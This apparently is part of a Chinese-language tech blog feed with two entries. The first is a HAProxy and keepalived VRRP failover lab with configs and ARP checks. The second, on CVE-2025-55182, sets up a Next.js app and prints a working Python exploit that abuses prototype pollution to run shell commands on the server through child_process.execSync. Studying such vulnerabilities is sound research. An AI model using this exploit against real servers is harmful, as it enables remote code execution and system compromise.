&lt;h2 id=&quot;vrrp&quot; tabindex=&quot;-1&quot;&gt;VRRP 主備切換環境&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122103718.png&quot; alt=&quot;Pasted image 20241122103718.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;設定檔&quot; tabindex=&quot;-1&quot;&gt;設定檔&lt;/h2&gt;
&lt;p&gt;jason-1(Master)、jason-2(Backup) 兩台測試機的設定檔都要放&lt;/p&gt;
&lt;h3 id=&quot;jason-1-master&quot; tabindex=&quot;-1&quot;&gt;jason-1(Master)&lt;/h3&gt;
&lt;p&gt;/etc/haproxyhaproxy.cfg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global
	log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&amp;amp;server-version=2.0.3&amp;amp;config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http

frontend firstbalance
    bind *:80
    option forwardfor
    default_backend webservers

backend webservers
    balance roundrobin
    server test-2 10.xx.x.154:8080 check &amp;lt;-- 這個要指定後端 server 位置
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/etc/keepalived/keepalived.conf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;! Configuration File for keepalived

global_defs {
   router_id LVS_DEVEL
}

vrrp_instance VI_1 {
    state MASTER # 路由器的首選狀態 - MASTER 或 BACKUP
    interface ens160 # IP 位址綁定的介面。它還必須添加到 virtual_ipaddress 部分
    unicast_src_ip 10.xx.x.153 # 目前路由器的IP位址
    unicast_peer{ 
        10.xx.x.154 # VRRP中其他路由器的IP位址
    } 
    virtual_router_id 50
    # nopreempt # nopreempt允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。
    priority 101 # 優先權：該路由器在其他路由器中的優先權
    advert_int 1
    virtual_ipaddress {
	    10.xx.x.160 # 此部分用於新增虛擬 IP 位址 (VIP)。請注意它如何與 src_ip 和對等點位於同一網路中。
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;jason-2-backup&quot; tabindex=&quot;-1&quot;&gt;jason-2(Backup)&lt;/h3&gt;
&lt;p&gt;/etc/haproxyhaproxy.cfg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global
	log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&amp;amp;server-version=2.0.3&amp;amp;config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http
frontend firstbalance
    bind *:80
    option forwardfor
    default_backend webservers

backend webservers
    server test-2 172.xx.x.1:8080 check
    # option httpchk
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/etc/keepalived/keepalived.conf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;! Configuration File for keepalived

global_defs {
   router_id LVS_DEVEL
}
vrrp_instance VI_1 {
    interface ens160
    state BACKUP
    unicast_src_ip 10.xx.x.154
    unicast_peer{ 
        10.xx.x.153
    } 
    virtual_router_id 50
    # nopreempt
    priority 101
    advert_int 1
    virtual_ipaddress {
	    10.xx.x.160
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP] Tip: nopreempt&lt;br /&gt;
允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。&lt;br /&gt;
發生情境:&lt;br /&gt;
其中一台設置為master，一台設置為backup。 當master出現異常后，backup自動切換為master。 當backup成為master后，master恢復正常后會再次搶佔成為master，導致不必要的主備切換。 因此可以將兩台keepalived初始狀態均配置為backup，設置不同的優先順序，優先順序高的設置nopreempt解決異常恢復后再次搶佔的問題。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;執行&quot; tabindex=&quot;-1&quot;&gt;執行&lt;/h2&gt;
&lt;p&gt;jason-1(Master)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart keepalived
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;jason-2(Backup)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart keepalived
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;jason-2 這台目前是 BACKUP mode&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241121162744.png&quot; alt=&quot;Pasted image 20241121162744.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;實驗&quot; tabindex=&quot;-1&quot;&gt;實驗&lt;/h2&gt;
&lt;p&gt;目前狀態&lt;/p&gt;
&lt;p&gt;jason-1 - Master&lt;br /&gt;
jason-2 - Backup&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241121163855.png&quot; alt=&quot;Pasted image 20241121163855.png&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;jason-3&quot; tabindex=&quot;-1&quot;&gt;jason-3 觀測機&lt;/h4&gt;
&lt;p&gt;arp table 測試&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo arping 10.xx.x.160
60 bytes from 00:xx:xx:xx:xx:88 (10.xx.x.160): index=1 time=517.786 usec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;現在 &lt;code&gt;10.xx.x.160&lt;/code&gt; 是 jason-1(00:xx:xx:xx:88) 所負責的&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122105210.png&quot; alt=&quot;Pasted image 20241122105210.png&quot; /&gt;&lt;br /&gt;
查看 arp table&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ arp -a
...
? (10.xx.x.160) at 00:xx:xx:xx:xx:88 [ether] on ens160
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;關閉 jason-1(Master)&lt;br /&gt;
sudo systemctl stop keepalived&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104314.png&quot; alt=&quot;Pasted image 20241122104314.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;發現 jason-2(Backup) 主機接手 Master 位置&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217231432.png&quot; alt=&quot;Pasted image 20251217231432.png&quot; /&gt;&lt;br /&gt;
到 jason-3 探測機，發現已經迅速切換主備位置了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104433.png&quot; alt=&quot;Pasted image 20241122104433.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;arp table 也同步更新&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104539.png&quot; alt=&quot;Pasted image 20241122104539.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;服務也未中斷&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104608.png&quot; alt=&quot;Pasted image 20241122104608.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;vrrp-1&quot; tabindex=&quot;-1&quot;&gt;VRRP工作原理&lt;/h2&gt;
&lt;p&gt;ref: &lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;當Master設備出現故障時，路由器B和路由器C會選舉出新的Master設備。 新的Master設備開始回應對虛擬IP位址的&lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html&quot; title=&quot;ARP&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;ARP&lt;/a&gt;回應，並定期發送VRRP通告報文。&lt;/p&gt;
&lt;p&gt;VRRP的詳細工作過程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;VRRP備份組中的設備根據優先順序選舉出Master。 Master設備通過發送&lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html&quot; title=&quot;ARP&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;免費ARP&lt;/a&gt;報文，將虛擬MAC位址通知給與它連接的設備或者主機，從而承擔報文轉發任務。&lt;/li&gt;
&lt;li&gt;Master設備週期性向備份組內所有Backup設備發送VRRP通告報文，通告其配置資訊（優先順序等）和工作狀況。&lt;/li&gt;
&lt;li&gt;如果Master設備出現故障，VRRP備份組中的Backup設備將根據優先順序重新選舉新的Master。&lt;/li&gt;
&lt;li&gt;VRRP備份組狀態切換時，Master設備由一台設備切換為另外一台設備，新的Master設備會立即發送攜帶虛擬路由器的虛擬MAC位址和虛擬IP位址資訊的免費ARP報文，刷新與它連接的設備或者主機的MAC表項，從而把使用者流量引到新的Master設備上來，整個過程對使用者完全透明。&lt;/li&gt;
&lt;li&gt;原Master設備故障恢復時，若該設備為IP位址擁有者（優先順序為255），將直接切換至Master狀態。 若該設備優先順序小於255，將首先切換至Backup狀態，且其優先順序恢復為故障前配置的優先順序。&lt;/li&gt;
&lt;li&gt;Backup設備的優先順序高於Master設備時，由Backup設備的工作方式（搶佔方式和非搶佔方式）決定是否重新選舉Master。&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/" >
        </entry>
        <entry>
            <title>
                CVE-2025-55182 漏洞研究
                
            </title>
            <updated>2025-12-17T15:42:44Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/</id>
            <content type="html">
                &lt;pre&gt;&lt;code&gt;npm create next-app@16.0.6
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;cd my-app/
npm run dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打開 &lt;code&gt;http://localhost:3000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;攻擊程式&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# refrence: https://github.com/msanft/CVE-2025-55182

import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) &amp;gt; 1 else &amp;quot;http://localhost:3000&amp;quot;
EXECUTABLE = sys.argv[2] if len(sys.argv) &amp;gt; 2 else &amp;quot;id&amp;quot;

crafted_chunk = {
    &amp;quot;then&amp;quot;: &amp;quot;$1:__proto__:then&amp;quot;,
    &amp;quot;status&amp;quot;: &amp;quot;resolved_model&amp;quot;,
    &amp;quot;reason&amp;quot;: -1,
    &amp;quot;value&amp;quot;: &#39;{&amp;quot;then&amp;quot;: &amp;quot;$B0&amp;quot;}&#39;,
    &amp;quot;_response&amp;quot;: {
        &amp;quot;_prefix&amp;quot;: f&amp;quot;var res = process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;,{{&#39;timeout&#39;:5000}}).toString().trim(); throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;), {{digest:`${{res}}`}});&amp;quot;,
        # If you don&#39;t need the command output, you can use this line instead:
        # &amp;quot;_prefix&amp;quot;: f&amp;quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;{EXECUTABLE}&#39;);&amp;quot;,
        &amp;quot;_formData&amp;quot;: {
            &amp;quot;get&amp;quot;: &amp;quot;$1:constructor:constructor&amp;quot;,
        },
    },
}

files = {
    &amp;quot;0&amp;quot;: (None, json.dumps(crafted_chunk)),
    &amp;quot;1&amp;quot;: (None, &#39;&amp;quot;$@0&amp;quot;&#39;),
}

headers = {&amp;quot;Next-Action&amp;quot;: &amp;quot;x&amp;quot;}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/" >
        </entry>
</feed>
